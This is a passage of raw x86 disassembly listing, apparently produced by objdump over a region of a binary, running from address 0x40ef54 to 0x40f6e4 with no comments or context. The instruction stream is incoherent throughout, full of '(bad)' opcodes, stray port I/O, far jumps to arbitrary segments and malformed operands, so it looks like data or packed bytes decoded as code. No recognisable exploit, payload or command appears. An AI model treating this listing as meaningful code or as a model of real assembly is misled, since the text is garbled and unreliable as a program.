  40ef54:	mov    DWORD PTR [edi+0x5bd600ef],ecx
  40ef5a:	xor    al,0xbb
  40ef5c:	mov    bh,0xe7
  40ef5e:	repnz gs (bad) 
  40ef61:	xchg   ebp,eax
  40ef62:	dec    edi
  40ef63:	mov    dh,0xd4
  40ef65:	dec    edx
  40ef66:	xchg   cl,dh
  40ef68:	pop    ebx
  40ef69:	dec    ebx
  40ef6a:	(bad)  
  40ef6b:	pop    ecx
  40ef6c:	mov    fs,WORD PTR [ebx]
  40ef6e:	daa    
  40ef6f:	test   DWORD PTR [esi+0x17d2f62c],ebx
  40ef75:	mov    eax,ds:0x8b853d0f
  40ef7a:	clc    
  40ef7b:	popa   
  40ef7c:	adc    BYTE PTR [ebp-0x347e7456],0x71
  40ef83:	out    dx,eax
  40ef84:	scas   eax,DWORD PTR es:[edi]
  40ef85:	push   0xffffffa6
  40ef87:	repz push ds
  40ef89:	cmp    eax,0x2515f120
  40ef8e:	addr16 iret 
  40ef90:	scas   al,BYTE PTR es:[edi]
  40ef91:	les    edi,FWORD PTR [edx+ecx*4]
  40ef94:	cdq    
  40ef95:	jb     0x40f000
  40ef97:	mov    dh,cl
  40ef99:	jno    0x40effb
  40ef9b:	mov    WORD PTR [ecx+0x950cd8b],fs
  40efa1:	clc    
  40efa2:	lock mov ds:0x3885237,al
  40efa8:	out    0x0,al
  40efaa:	dec    ebp
  40efab:	xor    ah,BYTE PTR [edi+0x79]
  40efae:	div    BYTE PTR ds:[edi]
  40efb1:	lds    ebp,FWORD PTR [esi-0x77]
  40efb4:	xor    eax,0x775a333
  40efb9:	popa   
  40efba:	push   es
  40efbb:	popf   
  40efbc:	icebp  
  40efbd:	lea    ebx,[eax]
  40efbf:	mov    eax,DWORD PTR [edx+0x65838608]
  40efc5:	sbb    DWORD PTR [edi],eax
  40efc7:	dec    edi
  40efc8:	pop    esi
  40efc9:	xchg   eax,esp
  40efcb:	xchg   edi,eax
  40efcc:	mov    ch,BYTE PTR [eax+0x22]
  40efcf:	or     BYTE PTR [eax+0x79],dh
  40efd2:	shl    BYTE PTR [eax-0x2e],1
  40efd5:	fcmovne st,st(2)
  40efd7:	test   BYTE PTR [ecx],0x96
  40efda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40efdb:	pop    eax
  40efdc:	loopne 0x40f034
  40efde:	pop    ebx
  40efdf:	dec    esi
  40efe0:	in     al,0x1d
  40efe2:	loope  0x40ef95
  40efe4:	cmp    edi,ecx
  40efe6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40efe7:	outs   dx,BYTE PTR ds:[esi]
  40efe8:	jl     0x40f058
  40efea:	mov    al,0x73
  40efec:	loop   0x40efc1
  40efee:	push   eax
  40efef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eff0:	daa    
  40eff1:	ror    BYTE PTR [eax],0x4d
  40eff4:	adc    eax,0x948cc831
  40eff9:	push   es
  40effa:	neg    DWORD PTR [ebp+0x1a]
  40effd:	lahf   
  40effe:	stos   DWORD PTR es:[edi],eax
  40efff:	into   
  40f000:	mov    esi,0xee6c5fbc
  40f005:	shl    DWORD PTR [edi-0x3e],0xcb
  40f009:	das    
  40f00a:	cdq    
  40f00b:	xchg   ebp,eax
  40f00c:	jmp    0xcfa7:0xa3a95058
  40f013:	in     al,dx
  40f014:	adc    ah,dl
  40f016:	pop    ebx
  40f017:	call   0x5fe8:0x563c6a08
  40f01e:	div    ah
  40f020:	mov    ds:0xd2afe27d,al
  40f025:	lea    ecx,[edi-0x11932f92]
  40f02b:	(bad)  
  40f02c:	test   BYTE PTR ds:0x93d89ca7,0xef
  40f033:	sub    DWORD PTR [eax+0x14af593a],ebp
  40f039:	retf   0x7b98
  40f03c:	repnz mov DWORD PTR [ecx+0x2f464e5b],0xe6844c03
  40f047:	into   
  40f048:	arpl   WORD PTR [edx],ax
  40f04a:	data16 ja 0x40f06a
  40f04d:	adc    al,0x2a
  40f04f:	push   ebp
  40f050:	test   al,0x18
  40f052:	cmp    edi,DWORD PTR fs:0x7fd2d0de
  40f059:	shl    DWORD PTR [esi-0x26],cl
  40f05c:	jns    0x40f054
  40f05e:	loop   0x40f03f
  40f060:	mov    esp,0x67302ef5
  40f065:	or     eax,0xeac2703f
  40f06a:	(bad)  
  40f06b:	inc    ebp
  40f06c:	xor    ecx,edx
  40f06e:	jae    0x40f0dd
  40f070:	add    BYTE PTR ds:0xce184111,0x5c
  40f077:	aaa    
  40f078:	adc    DWORD PTR [edx],esi
  40f07a:	pop    esp
  40f07b:	jns    0x40f08e
  40f07d:	xchg   edx,eax
  40f07e:	mov    ds:0xa0626f6f,eax
  40f083:	jmp    0x246852b9
  40f088:	enter  0xb2cb,0xb7
  40f08c:	retf   0x8c60
  40f08f:	sbb    eax,0x96028cb5
  40f094:	push   ecx
  40f095:	add    eax,DWORD PTR [esi+0x1fbb5886]
  40f09b:	iret   
  40f09c:	clc    
  40f09d:	(bad)  
  40f09e:	ss dec esi
  40f0a0:	and    dl,dh
  40f0a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0a3:	inc    ecx
  40f0a4:	je     0x40f02e
  40f0a6:	push   edi
  40f0a7:	jo     0x40f031
  40f0a9:	push   ds
  40f0aa:	mov    al,ds:0xe5a88a91
  40f0af:	(bad)  
  40f0b1:	popa   
  40f0b2:	sbb    BYTE PTR [edi+0x3e],dl
  40f0b5:	inc    ebp
  40f0b6:	or     al,0xca
  40f0b8:	sbb    eax,0x23fdc58f
  40f0bd:	std    
  40f0be:	jmp    0x40f05c
  40f0c0:	mov    dl,0x34
  40f0c2:	push   ss
  40f0c3:	cli    
  40f0c4:	rol    edi,1
  40f0c6:	dec    ebp
  40f0c7:	call   0x5217:0x7f4998d2
  40f0ce:	lods   al,BYTE PTR ds:[esi]
  40f0cf:	in     al,dx
  40f0d0:	into   
  40f0d1:	fild   QWORD PTR [ebp-0x2b61e41d]
  40f0d7:	jo     0x725cb97f
  40f0dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0de:	lahf   
  40f0df:	retf   0xb6ad
  40f0e2:	mov    ds:0xafef0e1d,al
  40f0e7:	mov    esi,0xfad66fcd
  40f0ec:	out    dx,eax
  40f0ed:	(bad)  
  40f0ee:	mov    ecx,0xeca79e24
  40f0f3:	sahf   
  40f0f4:	mov    dl,0xf7
  40f0f6:	cs ss xchg edi,eax
  40f0f9:	dec    edx
  40f0fa:	ss ja  0x40f084
  40f0fd:	cmc    
  40f0fe:	ja     0x40f124
  40f100:	mov    al,ds:0x587cd931
  40f105:	xor    al,0x0
  40f107:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f108:	ret    
  40f109:	mov    WORD PTR ds:0x7f394519,cs
  40f10f:	dec    esi
  40f110:	xor    esp,ebx
  40f112:	or     BYTE PTR ds:0xdc9b38db,0x44
  40f119:	enter  0x19d3,0x5
  40f11d:	loop   0x40f174
  40f11f:	cmc    
  40f120:	imul   ebp,DWORD PTR [ebx],0x16
  40f123:	xchg   ebx,edi
  40f125:	lods   eax,DWORD PTR ds:[esi]
  40f126:	dec    esi
  40f127:	loope  0x40f0bc
  40f129:	jmp    DWORD PTR [edx-0x12545a5f]
  40f12f:	mov    edi,0xb1cc58f4
  40f134:	push   esi
  40f135:	mov    ds:0x7f6c17e0,al
  40f13a:	pop    esp
  40f13b:	(bad)  
  40f13d:	pop    ebx
  40f13e:	push   edi
  40f13f:	sbb    eax,0xe3e2ea20
  40f144:	aad    0x19
  40f146:	jle    0x40f108
  40f148:	enter  0x3c86,0xda
  40f14c:	mov    ecx,0x88c6d981
  40f151:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f152:	pop    ebx
  40f153:	lea    ecx,[ecx+0x74cfe60a]
  40f159:	imul   esi,esp,0x25
  40f15c:	mov    ecx,0x41d5e667
  40f161:	int    0xf5
  40f163:	pusha  
  40f164:	xor    BYTE PTR [edx],al
  40f166:	movntps XMMWORD PTR [esp+ecx*8],xmm2
  40f16a:	push   ebx
  40f16b:	adc    al,0x2f
  40f16d:	bound  edi,QWORD PTR [ebx+0x69e6fcb3]
  40f173:	add    BYTE PTR [esi+0x65],ch
  40f176:	xor    al,0x90
  40f178:	jmp    0x9b86d307
  40f17d:	out    dx,al
  40f17e:	ja     0x40f154
  40f180:	dec    ecx
  40f181:	fwait
  40f182:	push   ebp
  40f183:	adc    al,0x16
  40f185:	test   eax,0xc5745b68
  40f18a:	cmc    
  40f18b:	xchg   DWORD PTR [esi+ecx*4+0x4b],eax
  40f18f:	mov    esi,0x476c3afe
  40f194:	popa   
  40f195:	pop    edi
  40f196:	sbb    ecx,DWORD PTR [ecx+edi*2+0x25595f9b]
  40f19d:	pop    esp
  40f19e:	mov    cl,0xb5
  40f1a0:	(bad)  
  40f1a1:	aas    
  40f1a2:	pop    ss
  40f1a3:	xchg   edi,eax
  40f1a4:	mov    al,ds:0x2b9756d5
  40f1a9:	xor    BYTE PTR [esi+0x80dbb63],dl
  40f1af:	stos   BYTE PTR es:[edi],al
  40f1b0:	inc    ebx
  40f1b1:	and    eax,0x3bc6e7bb
  40f1b6:	hlt    
  40f1b7:	outs   dx,DWORD PTR ds:[esi]
  40f1b8:	or     al,0x68
  40f1ba:	push   eax
  40f1bb:	mov    al,0x70
  40f1bd:	mov    eax,0x5532107b
  40f1c2:	lods   al,BYTE PTR ds:[esi]
  40f1c3:	cmp    esi,eax
  40f1c5:	mov    ds:0xbc2fcff,eax
  40f1ca:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  40f1cc:	mov    ds:0xb2ac8c9d,al
  40f1d1:	test   DWORD PTR [eax+0x18],0xd85f5bb0
  40f1d8:	das    
  40f1d9:	jno    0x40f22f
  40f1db:	repz push eax
  40f1dd:	inc    esp
  40f1de:	lods   eax,DWORD PTR ds:[esi]
  40f1df:	mov    al,0x84
  40f1e1:	jne    0x40f1b7
  40f1e3:	sar    dl,0xcf
  40f1e6:	retf   
  40f1e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f1e8:	retf   
  40f1e9:	addr16 (bad) 
  40f1eb:	rcr    BYTE PTR [esi-0x34],cl
  40f1ee:	xor    bh,ah
  40f1f0:	in     al,0x73
  40f1f2:	outs   dx,DWORD PTR ds:[esi]
  40f1f3:	mov    BYTE PTR [edi+0x1a0efb97],dh
  40f1f9:	out    0xa,eax
  40f1fb:	sar    ebx,0x48
  40f1fe:	(bad)  
  40f1ff:	aam    0xd1
  40f201:	jb     0x40f1b8
  40f203:	mov    DWORD PTR [edx+0x605a4e12],edx
  40f209:	test   BYTE PTR [edi],0xe
  40f20c:	inc    esi
  40f20d:	sbb    al,BYTE PTR [esi-0x3b04838a]
  40f213:	popf   
  40f214:	shr    DWORD PTR [edi-0x70],0xd7
  40f218:	or     BYTE PTR [eax-0x2],0xdc
  40f21c:	pop    DWORD PTR [edi-0x76]
  40f21f:	and    BYTE PTR [eax],cl
  40f221:	ret    0x4bec
  40f224:	jns    0x40f1c0
  40f226:	pop    edi
  40f227:	mov    ds:0x4b18822c,eax
  40f22c:	loop   0x40f23a
  40f22e:	adc    al,0x6f
  40f230:	scas   al,BYTE PTR es:[edi]
  40f231:	sub    esi,DWORD PTR [edx-0x4b]
  40f234:	lods   al,BYTE PTR ds:[esi]
  40f235:	mov    al,ds:0x23c5cb96
  40f23a:	sub    BYTE PTR [ebx+0x74ebc8a1],bl
  40f240:	cmp    BYTE PTR [eax],0x71
  40f243:	sbb    DWORD PTR [ecx],esp
  40f245:	fwait
  40f246:	sub    ch,BYTE PTR [eax+esi*1+0x2eabab38]
  40f24d:	cwde   
  40f24e:	cmp    DWORD PTR [eax+0x4cdcc5d5],eax
  40f254:	stc    
  40f255:	fsub   DWORD PTR [ebp-0x67]
  40f258:	ficom  DWORD PTR ds:0x41e8ac05
  40f25e:	mov    dl,0x74
  40f260:	cmp    eax,0xf8a6ff55
  40f265:	repz jne 0x40f2a3
  40f268:	add    ch,BYTE PTR [edi+eiz*2]
  40f26b:	lea    ecx,[esi+0x71]
  40f26e:	daa    
  40f26f:	inc    edx
  40f270:	jns    0x40f278
  40f272:	test   ebx,ecx
  40f274:	popf   
  40f275:	repnz scas al,BYTE PTR es:[edi]
  40f277:	out    0xe3,eax
  40f279:	add    esi,0x57cde50a
  40f27f:	stos   BYTE PTR es:[edi],al
  40f280:	call   0xd4675dc0
  40f285:	mov    eax,0xaedaafe2
  40f28a:	inc    esp
  40f28b:	mov    ah,0x85
  40f28d:	pop    es
  40f28e:	test   DWORD PTR [esi],ecx
  40f290:	mov    ?,WORD PTR [ecx+0x12]
  40f293:	push   es
  40f294:	daa    
  40f295:	mov    al,ds:0xef0f5d4a
  40f29a:	fidivr WORD PTR [ebp*8+0x5b2f8ad9]
  40f2a1:	ret    0x1130
  40f2a4:	loop   0x40f279
  40f2a6:	jnp    0x40f278
  40f2a8:	adc    dh,BYTE PTR [ebp+esi*2+0x67cf5818]
  40f2af:	jp     0x40f2ed
  40f2b1:	js     0x40f2f6
  40f2b3:	test   esp,ebp
  40f2b5:	xchg   esp,eax
  40f2b6:	jae    0x40f31a
  40f2b8:	fstp   QWORD PTR [eax]
  40f2ba:	div    DWORD PTR [ebx+0x7225811f]
  40f2c0:	xchg   ebx,eax
  40f2c1:	cmp    ecx,DWORD PTR [edi+0x47]
  40f2c4:	xchg   ebp,eax
  40f2c5:	inc    esp
  40f2c6:	or     BYTE PTR ds:[ebx+0x6cb85ce6],ch
  40f2cd:	mov    cl,0x3
  40f2cf:	stos   DWORD PTR es:[edi],eax
  40f2d0:	leave  
  40f2d1:	mov    bh,0x95
  40f2d3:	sti    
  40f2d4:	inc    ecx
  40f2d5:	mov    ebp,0x505d5900
  40f2da:	add    al,0x8b
  40f2dc:	pop    ecx
  40f2dd:	sbb    bl,BYTE PTR [eax-0x47]
  40f2e0:	ficomp WORD PTR [edi+0x52303a4e]
  40f2e6:	adc    BYTE PTR [ecx],ah
  40f2e8:	aad    0x82
  40f2ea:	inc    esi
  40f2eb:	retf   0x8970
  40f2ee:	outs   dx,DWORD PTR ds:[esi]
  40f2ef:	mov    ds:0xa24edd19,al
  40f2f4:	ds mov ecx,0xb7cd9a75
  40f2fa:	pop    ds
  40f2fb:	fisttp QWORD PTR ds:0x39aa2f5a
  40f301:	dec    ebx
  40f302:	add    eax,0xa09f9095
  40f307:	and    eax,ebx
  40f309:	adc    cl,al
  40f30b:	xchg   edi,eax
  40f30c:	mov    bh,0xba
  40f30e:	imul   eax,DWORD PTR [ebp-0xbbb58ec],0x1e617219
  40f318:	retf   0xd5cf
  40f31b:	jge    0x40f350
  40f31d:	(bad)  
  40f31e:	mov    bl,0x7d
  40f320:	xchg   esi,eax
  40f321:	aaa    
  40f322:	and    al,0xc8
  40f324:	test   DWORD PTR ss:[eax+0x19],edi
  40f328:	sbb    DWORD PTR [esi],ebp
  40f32a:	sbb    BYTE PTR [ebx*2-0x2265d439],dl
  40f331:	xchg   ebx,eax
  40f332:	test   BYTE PTR [ebx+0x50],dl
  40f335:	jecxz  0x40f2e9
  40f337:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f338:	jne    0x40f2d5
  40f33a:	daa    
  40f33b:	lods   al,BYTE PTR ds:[esi]
  40f33c:	sub    bl,BYTE PTR [edi+edx*4]
  40f33f:	int    0xb2
  40f341:	repnz push ebp
  40f343:	rol    BYTE PTR ds:0xde7a1e1c,0x86
  40f34a:	push   esi
  40f34b:	cmp    al,0xf8
  40f34d:	inc    eax
  40f34e:	mov    BYTE PTR [eax+ebx*2],cl
  40f351:	push   edi
  40f352:	mov    esp,0x63d9731
  40f357:	pop    edi
  40f358:	inc    ebp
  40f359:	mov    eax,0xe0a70b2d
  40f35e:	mov    BYTE PTR [edi-0x5],bl
  40f361:	out    0xf6,al
  40f363:	loop   0x40f3a3
  40f365:	(bad)  
  40f366:	dec    BYTE PTR [eax]
  40f368:	imul   ecx,DWORD PTR [edx],0xffffff82
  40f36b:	inc    ebp
  40f36c:	call   0xd919:0x1ec6919a
  40f373:	xor    edi,DWORD PTR [edi]
  40f375:	push   cs
  40f376:	jnp    0x40f3f7
  40f378:	cld    
  40f379:	ins    BYTE PTR es:[edi],dx
  40f37a:	mov    ah,0xda
  40f37c:	jecxz  0x40f3a5
  40f37e:	ds ja  0x40f341
  40f381:	in     al,dx
  40f382:	jle    0x40f3dd
  40f384:	and    al,0x29
  40f386:	cmp    BYTE PTR [edx],ch
  40f388:	and    dl,BYTE PTR [ebp+0x11]
  40f38b:	xchg   esp,eax
  40f38c:	js     0x40f3b4
  40f38e:	lahf   
  40f38f:	inc    ebx
  40f390:	dec    ebx
  40f391:	in     eax,dx
  40f392:	(bad)
  40f395:	shl    BYTE PTR [ebx],1
  40f397:	xor    eax,0xd4efd49d
  40f39c:	loop   0x40f417
  40f39e:	mov    eax,0xacebde48
  40f3a3:	add    bh,BYTE PTR es:[edi+ebx*1]
  40f3a7:	sbb    eax,0x41fd29ef
  40f3ac:	push   esi
  40f3ad:	cmp    al,0x91
  40f3af:	and    ebp,edx
  40f3b1:	jns    0x40f33f
  40f3b3:	jmp    0x40f33e
  40f3b5:	jp     0x40f342
  40f3b7:	mov    cl,0xc5
  40f3b9:	cmp    al,0x31
  40f3bb:	iret   
  40f3bc:	jecxz  0x40f3c6
  40f3be:	sub    al,0xb9
  40f3c0:	xchg   ebp,eax
  40f3c1:	xchg   edx,eax
  40f3c2:	and    BYTE PTR [edi+0x74],dl
  40f3c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f3c6:	sbb    ch,dl
  40f3c8:	sbb    al,0x73
  40f3ca:	jg     0x40f40e
  40f3cc:	fsubr  st,st(7)
  40f3ce:	add    eax,0xa82753d9
  40f3d3:	ds in  eax,dx
  40f3d5:	aam    0x5b
  40f3d7:	icebp  
  40f3d8:	push   edi
  40f3d9:	not    BYTE PTR [edx+edi*2]
  40f3dc:	ror    edi,0xa0
  40f3df:	inc    esp
  40f3e0:	div    ch
  40f3e2:	inc    ebp
  40f3e3:	mov    eax,0x18cbd10
  40f3e8:	mov    ds:0x1d10b064,al
  40f3ed:	or     bh,BYTE PTR [ebx]
  40f3ef:	inc    eax
  40f3f0:	iret   
  40f3f1:	xor    BYTE PTR [ebp+eax*1+0x7b],al
  40f3f5:	arpl   dx,cx
  40f3f7:	bound  eax,QWORD PTR [ebx+0x4b2fda30]
  40f3fd:	pusha  
  40f3fe:	sahf   
  40f3ff:	punpckhdq mm5,QWORD PTR [ecx]
  40f402:	jmp    0xa2bb:0x3c16aad7
  40f409:	je     0x40f419
  40f40b:	push   ebp
  40f40c:	mov    bh,dl
  40f40e:	mov    esp,0x1c431e7c
  40f413:	jnp    0x40f40e
  40f415:	sbb    al,0x63
  40f417:	test   eax,0x280cb038
  40f41c:	test   DWORD PTR [esi+0x5dbc196f],edi
  40f422:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f423:	ja     0x40f47d
  40f425:	cwde   
  40f426:	(bad)  
  40f427:	mov    al,ds:0x2508877c
  40f42c:	stos   DWORD PTR es:[edi],eax
  40f42d:	pop    edi
  40f42e:	xchg   esi,eax
  40f42f:	and    DWORD PTR [ebx-0x71051926],edi
  40f435:	and    al,0x74
  40f437:	cdq    
  40f438:	mul    eax
  40f43a:	rcl    BYTE PTR [ebx],0xf4
  40f43d:	je     0x40f445
  40f43f:	and    DWORD PTR ss:[ebp+0x2c46360c],eax
  40f446:	loope  0x40f3ee
  40f448:	pop    ebx
  40f449:	sbb    BYTE PTR [edi],dh
  40f44b:	mov    ebp,0x109e1228
  40f450:	xchg   ecx,eax
  40f451:	jo     0x40f41a
  40f453:	or     BYTE PTR [esi+0x3d6738d6],dh
  40f459:	jo     0x40f411
  40f45b:	mov    ch,0xd
  40f45d:	mov    bh,0xbd
  40f45f:	push   esp
  40f460:	add    eax,0xadbf776c
  40f465:	stc    
  40f466:	inc    ebx
  40f467:	xlat   BYTE PTR ds:[ebx]
  40f468:	cmp    DWORD PTR [eax],esp
  40f46a:	jmp    0xb0d4fb1a
  40f46f:	push   ebx
  40f470:	cmp    al,0xcb
  40f472:	lea    edx,[edx]
  40f474:	xor    ecx,DWORD PTR [eax+0x239f79b]
  40f47a:	out    dx,eax
  40f47b:	stos   BYTE PTR es:[edi],al
  40f47c:	outs   dx,BYTE PTR ds:[esi]
  40f47d:	or     BYTE PTR [ebx+0x2f],0x5
  40f481:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40f483:	in     al,0x5
  40f485:	inc    edx
  40f486:	es jae 0x40f4ae
  40f489:	in     al,0x1d
  40f48b:	mov    ecx,0x5fc09ce5
  40f490:	mov    esi,0xd97d22c1
  40f495:	out    dx,eax
  40f496:	pop    ss
  40f497:	pushf  
  40f498:	push   cs
  40f499:	dec    edi
  40f49a:	mov    bl,0xfd
  40f49c:	leave  
  40f49d:	cs int 0x7c
  40f4a0:	jno    0x40f430
  40f4a2:	inc    ecx
  40f4a3:	fnstcw WORD PTR [ecx]
  40f4a5:	nop
  40f4a6:	cdq    
  40f4a7:	jl     0x40f48a
  40f4a9:	push   esp
  40f4aa:	sbb    esi,ebx
  40f4ac:	sbb    ah,al
  40f4ae:	xchg   edx,eax
  40f4af:	das    
  40f4b0:	and    DWORD PTR cs:[edx-0x4ef1cae9],esi
  40f4b7:	xchg   BYTE PTR [edi+eax*4+0x674bb2b7],bl
  40f4be:	cwde   
  40f4bf:	popa   
  40f4c0:	cmp    esi,DWORD PTR [ebp+edi*4+0x3e]
  40f4c4:	out    dx,eax
  40f4c5:	scas   al,BYTE PTR es:[edi]
  40f4c6:	dec    ecx
  40f4c7:	add    ebp,esp
  40f4c9:	jno    0x40f4fe
  40f4cb:	cdq    
  40f4cc:	das    
  40f4cd:	add    eax,0xc51d098d
  40f4d2:	ja     0x40f4fc
  40f4d4:	sbb    al,0x5c
  40f4d6:	pusha  
  40f4d7:	call   0xb852:0xee7f8a3a
  40f4de:	mov    al,dl
  40f4e0:	jmp    0xa435:0x1fe43a26
  40f4e7:	inc    esi
  40f4e8:	dec    edi
  40f4e9:	bound  edx,QWORD PTR [esi-0x49d0bd55]
  40f4ef:	sbb    BYTE PTR [esi+0x2e],bl
  40f4f2:	mov    ds:0xb1478468,eax
  40f4f7:	jmp    0x40f52d
  40f4f9:	inc    ebp
  40f4fa:	xor    al,0xa9
  40f4fc:	cmp    edx,esp
  40f4fe:	sahf   
  40f4ff:	push   eax
  40f500:	inc    ecx
  40f501:	add    ebp,DWORD PTR [ebp+eax*4-0x5316d964]
  40f508:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f509:	dec    ebp
  40f50a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f50b:	loopne 0x40f52f
  40f50d:	fsub   DWORD PTR [ecx+0xb]
  40f510:	or     al,0xa3
  40f512:	aaa    
  40f513:	push   ebp
  40f514:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f515:	popf   
  40f516:	inc    ebx
  40f517:	sbb    eax,0xd54ec1d
  40f51c:	out    dx,al
  40f51d:	dec    eax
  40f51e:	mov    ah,0x3b
  40f520:	and    BYTE PTR [ecx+edx*2-0x62fadfc4],bh
  40f527:	add    BYTE PTR [eax],ch
  40f529:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f52a:	test   eax,0xfc871caa
  40f52f:	call   DWORD PTR [ebx+0x4ed531a9]
  40f535:	(bad)  
  40f536:	jg     0x40f56b
  40f538:	xor    BYTE PTR [esi-0xb6132d2],dh
  40f53e:	cwde   
  40f53f:	out    0x97,al
  40f541:	add    al,cl
  40f543:	mov    ds:0xb428961b,al
  40f548:	shr    ah,0x7f
  40f54b:	call   0x411192f6
  40f550:	stos   BYTE PTR es:[edi],al
  40f551:	shl    ah,1
  40f553:	mov    ds:0xc4f93b9b,eax
  40f558:	or     al,0xb4
  40f55a:	ss jge 0x40f5a8
  40f55d:	push   ds
  40f55e:	push   ecx
  40f55f:	rol    DWORD PTR [edx+0x5de4e50b],1
  40f565:	mov    ch,0x79
  40f567:	add    ebp,0x6fef6764
  40f56d:	daa    
  40f56e:	test   al,0x4f
  40f570:	mov    cl,0xc9
  40f572:	pop    es
  40f573:	nop
  40f574:	pop    esp
  40f575:	dec    ebx
  40f576:	lahf   
  40f577:	ss mov bl,0xe
  40f57a:	jbe    0x40f555
  40f57c:	jae    0x40f51e
  40f57e:	sbb    al,0x8c
  40f580:	cmp    DWORD PTR [edx-0x25],ecx
  40f583:	adc    BYTE PTR es:[eax],ch
  40f586:	dec    ebx
  40f587:	out    0xec,eax
  40f589:	push   ebx
  40f58a:	cmp    bh,al
  40f58c:	dec    edi
  40f58d:	xor    eax,0xa35caf8a
  40f592:	(bad)  
  40f593:	test   eax,0x36659c49
  40f598:	or     BYTE PTR [edi-0x47],cl
  40f59b:	mov    al,0x5c
  40f59d:	data16 out dx,al
  40f59f:	push   ebx
  40f5a0:	add    eax,0xaa5637ab
  40f5a5:	push   esp
  40f5a6:	imul   ebx,DWORD PTR [edx],0x7b447838
  40f5ac:	sahf   
  40f5ad:	arpl   bx,bx
  40f5af:	std    
  40f5b0:	call   0x7e8c:0x38bd2fda
  40f5b7:	scas   eax,DWORD PTR es:[edi]
  40f5b8:	cmp    ecx,0x7b757df5
  40f5be:	sbb    eax,0xfd609b90
  40f5c3:	inc    ecx
  40f5c4:	ret    0xcbf2
  40f5c7:	iret   
  40f5c8:	adc    DWORD PTR [ebx-0x2103e9c3],ecx
  40f5ce:	fs je  0x40f589
  40f5d1:	repnz aad 0x8d
  40f5d4:	sbb    eax,0xcea5d3fb
  40f5d9:	test   eax,0x8946e0f5
  40f5de:	xchg   edi,eax
  40f5df:	lahf   
  40f5e0:	sub    al,BYTE PTR [edx+0xb]
  40f5e3:	sbb    esi,eax
  40f5e5:	lods   eax,DWORD PTR ds:[esi]
  40f5e6:	dec    esp
  40f5e7:	loope  0x40f63c
  40f5e9:	sbb    eax,DWORD PTR [ebp+esi*1+0x6e9dcca3]
  40f5f0:	sbb    ebx,esi
  40f5f2:	jno    0x40f57e
  40f5f4:	jge    0x40f645
  40f5f6:	ret    0xa257
  40f5f9:	call   0x63294c29
  40f5fe:	push   0xfc948e38
  40f603:	enter  0xa11,0x16
  40f607:	cmp    eax,0x6d1b805
  40f60c:	(bad)  
  40f60d:	xchg   al,dh
  40f60f:	mov    esp,0x5346831d
  40f614:	xchg   dl,cl
  40f616:	sub    ch,cl
  40f618:	test   eax,0x9e2d9b75
  40f61d:	es or  eax,0xb6d3650
  40f623:	sbb    BYTE PTR [edx],bh
  40f625:	in     eax,0xa4
  40f627:	dec    ebp
  40f628:	push   es
  40f629:	mov    WORD PTR [ecx+0x6a018ae0],es
  40f62f:	sbb    BYTE PTR [edx],0x86
  40f632:	xor    ecx,DWORD PTR [eax+0x3805bb52]
  40f638:	std    
  40f639:	push   ds
  40f63a:	inc    eax
  40f63b:	or     cl,BYTE PTR [ecx-0x1e]
  40f63e:	add    edi,DWORD PTR [eax+eax*2+0x3]
  40f642:	pusha  
  40f643:	ds daa 
  40f645:	dec    edi
  40f646:	aaa    
  40f647:	mov    ?,WORD PTR [edx+0xf]
  40f64a:	pop    ecx
  40f64b:	pop    es
  40f64c:	test   eax,0x2745c85d
  40f651:	cmp    eax,0x1db5ea1d
  40f656:	mov    ah,0x3b
  40f658:	jle    0x40f69a
  40f65a:	inc    esp
  40f65b:	scas   eax,DWORD PTR es:[edi]
  40f65c:	mov    edi,DWORD PTR [esi+0x2ab6e75]
  40f662:	pop    ebp
  40f663:	push   0x4140ae6e
  40f668:	je     0x40f629
  40f66a:	pop    ebx
  40f66b:	mov    cl,0x8d
  40f66d:	cmp    al,0xc2
  40f66f:	fmul   DWORD PTR [ecx]
  40f671:	retf   
  40f672:	scas   eax,DWORD PTR es:[edi]
  40f673:	adc    DWORD PTR [ecx-0x3c],ebx
  40f676:	push   esp
  40f678:	ror    ebp,0x3e
  40f67b:	lahf   
  40f67c:	mov    esi,0xd78670af
  40f681:	ret    
  40f682:	mov    edi,0xc2a4970e
  40f687:	inc    esi
  40f688:	(bad)  
  40f689:	sbb    dh,BYTE PTR [ecx+0x1]
  40f68c:	outs   dx,DWORD PTR ds:[esi]
  40f68d:	sar    BYTE PTR [esi],cl
  40f68f:	add    DWORD PTR [ebx],edx
  40f691:	clc    
  40f692:	cli    
  40f693:	jb     0x40f618
  40f695:	push   0xdfc10b29
  40f69a:	xchg   esp,eax
  40f69b:	sbb    eax,0xc271c5be
  40f6a0:	add    eax,0x2ddbb92c
  40f6a5:	ss pop ss
  40f6a7:	lahf   
  40f6a8:	push   ds
  40f6a9:	jmp    0x40f6dd
  40f6ab:	cmpps  xmm4,XMMWORD PTR [ecx],0x97
  40f6af:	sub    ch,dl
  40f6b1:	xor    eax,0xa771228
  40f6b6:	jg     0x40f6a3
  40f6b8:	mov    esp,eax
  40f6ba:	fst    st(4)
  40f6bc:	loopne 0x40f648
  40f6be:	ret    0x1655
  40f6c1:	add    al,0xeb
  40f6c3:	test   BYTE PTR [ebx-0x15],ah
  40f6c6:	push   ebx
  40f6c7:	mov    eax,0x324d4f48
  40f6cc:	fdivp  st(6),st
  40f6ce:	test   eax,0xb22707d4
  40f6d3:	inc    edx
  40f6d4:	fdivr  DWORD PTR [eax-0x5f]
  40f6d7:	cmp    eax,DWORD PTR [edx]
  40f6d9:	fs xchg ecx,eax
  40f6db:	aam    0x6f
  40f6dd:	or     BYTE PTR [esi+eax*8+0x3e],ch
  40f6e1:	aas    
  40f6e2:	js     0x40f763
  40f6e4:	mov    ah,0x4c
